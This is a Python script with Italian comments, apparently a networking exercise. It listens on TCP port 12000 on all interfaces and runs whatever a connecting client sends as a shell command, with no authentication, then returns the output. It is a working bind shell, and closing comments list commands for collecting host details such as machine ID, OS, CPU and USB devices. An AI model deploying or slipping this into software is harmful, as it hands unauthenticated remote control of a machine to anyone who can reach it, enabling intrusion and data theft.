from socket import *
import subprocess
import os
from pathlib import Path
import traceback

serverPort = 12000
serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
                                            #socket(...) e' il costruttore della classe socket
serverSocket.bind( ('',serverPort) ) #collega la socket al port 1200
                                    #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
serverSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
print ('The server is ready to receive')


connectionSocket, addr = serverSocket.accept()
print('Accepted a new client', addr)
os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
                      #dell'utente che apre il file)

while True:
    try:
        cmd = connectionSocket.recv(1048576).decode(encoding='cp1252')
        if cmd.startswith("cd") :
            if not((cmd[2:]).isspace() or len(cmd)==2) :
                os.chdir(cmd[3:])
            result = os.getcwd()
        else:
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='cp1252').stdout
            if result == '':
                result = "comando non valido\n"
        connectionSocket.send(result.encode(encoding='cp1252'))
    except Exception:
        traceback.print_exc()
        result = "errore"
        connectionSocket.send(result.encode(encoding='cp1252'))
    


# cat /etc/machine-id -------- id macchina
# cat /etc/os-release --------- info generali os
# cat /proc/meminfo ------ info memoria
# cat /proc/cpuinfo ----- info dettagliate di ogni core
# lscpu ---- info architettura cpu
# lspci ------- info schede (video, audio...)
# lsusb ------ info dispositivi usb
# TYPE [nome file] ------ mostra a schermo il contenuto di un file